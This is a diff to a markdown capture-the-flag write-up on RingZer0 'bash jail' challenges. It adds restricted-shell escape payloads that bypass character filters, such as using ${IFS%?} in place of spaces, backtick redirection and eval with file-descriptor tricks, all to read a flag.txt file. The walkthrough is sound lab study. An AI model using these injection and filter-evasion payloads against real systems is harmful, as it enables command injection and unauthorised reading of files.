@@ -297,27 +297,45 @@ http://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-bash/
 ```
 
 ## bash jail 1
+You can spawn a shell using ```bash```
+Although you can't read (you could redirect stdout to stderr) files, you can try to run commands based on the file content
 
 ![jail1](https://user-images.githubusercontent.com/22657154/43360121-26199ee0-92b0-11e8-97f4-0e92220b8a76.png)
 
 ## bash jail 2 
-
-```https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces```
+Since you are not allowed to use certain characters like ";", "&", "]", "b", "d" and so on,
+<br>
+you must think of some way to read content of /home/level2/flag.txt
+- payloads:
+```bash
+hello|cat${IFS%?}/home/level2/flag.txt
 ```
-payload hello|cat${IFS%?}/home/level2/flag.txt or just hello|cat<flag.txt
+```bash
+hello|cat<flag.txt
+```
+```bash
+`</home/level2/flag.txt`
 ```
 
 ![jail2](https://user-images.githubusercontent.com/22657154/43360122-264aa3dc-92b0-11e8-91d3-fc1282eec2a3.png)
 
 ## bash jail 3
-We can no longer use cat, But there are other alternatives that will work the same way in this instance.
-<br>
-I opted for uniq, and since we can use spaces again why not just throw it in eval?
+The problem here is that stderr is being redirected to /dev/null:
+```assembly
+WARNING: this prompt is launched using ./prompt.sh 2>/dev/null
 ```
+The 2nd problem is that stdout and stderr are also redirected to /dev/null:
+```assembly
+output=`$input` &>/dev/null
+```
+But fortunately we are allowed to use eval (which doesn't match against the regexp in check_space)
+
+```bash
 eval uniq flag.txt 
 ```
-That passes the filter so all we need to do is figure out a way to actually make it print our result. We
-have three file descriptors: 0,1,2 and only 1 and 2 are blocked!
+this would cause an error since the shell cannot execute the command associated with the content in the flag file.
+<br>
+But since stderr is redirected I had to redirect again to sth else, like stdin (0):
 
 ![jail3](https://user-images.githubusercontent.com/22657154/43360268-1a5cf43c-92b3-11e8-8dc6-b44f63ee5ce8.png)
 
